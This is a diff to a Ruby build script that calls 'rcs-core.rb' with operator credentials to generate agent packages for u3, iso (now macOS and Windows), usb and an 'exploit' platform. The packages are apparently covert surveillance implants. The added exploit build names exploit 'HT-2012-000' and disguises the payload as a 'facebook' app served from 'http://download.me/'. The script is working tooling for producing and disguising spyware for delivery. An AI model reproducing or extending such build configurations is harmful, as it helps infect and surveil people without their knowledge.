@@ -53,9 +53,8 @@ params = {platform: 'u3',
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o u3.zip"
 ###################################################################################################
-=begin
 params = {platform: 'iso',
-          generate: {platforms: ['osx'],
+          generate: {platforms: ['osx', 'windows'],
                      binary: {demo: true, admin: false},
                      melt: {admin: false}
                     }
@@ -63,6 +62,26 @@ params = {platform: 'iso',
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o iso.zip"
-=end
+###################################################################################################
+params = {platform: 'usb',
+          generate: {binary: {demo: true, admin: false},
+                     melt: {admin: false}
+                    }
+          }
+
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o usb.zip"
+###################################################################################################
+params = {platform: 'exploit',
+          generate: {exploit: 'HT-2012-000',
+                     binary: {demo: true, admin: false},
+                     melt: {admin: false}
+                    },
+          melt: {appname: 'facebook',
+                 url: 'http://download.me/'}
+          }
+
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o exploit.zip"
 ###################################################################################################
 puts "End"
